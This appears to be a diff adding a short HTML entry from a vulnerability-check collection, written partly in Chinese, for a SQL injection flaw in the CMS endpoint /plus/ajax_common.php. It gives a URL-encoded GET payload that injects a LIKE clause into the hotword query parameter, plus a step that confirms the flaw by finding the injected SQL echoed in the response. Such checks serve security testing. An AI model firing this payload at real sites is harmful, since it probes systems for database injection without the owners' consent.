@@ -1,0 +1,11 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入 URL: </h3>
+    <ul>
+        <p>/plus/ajax_common.php</p>
+    </ul>
+    <h3>GET-payload: </h3>
+        <code>?act=hotword&query=%E4%BC%9A%E8%AE%A1%%27%20and%20w_hot%20like%20%27%1</code>
+    <h3>验证过程</h3>
+    <p>查看response text 是否含 "'会计%' and w_hot like '%1'" 字符(不包外层含双引号)</p>
+</div>
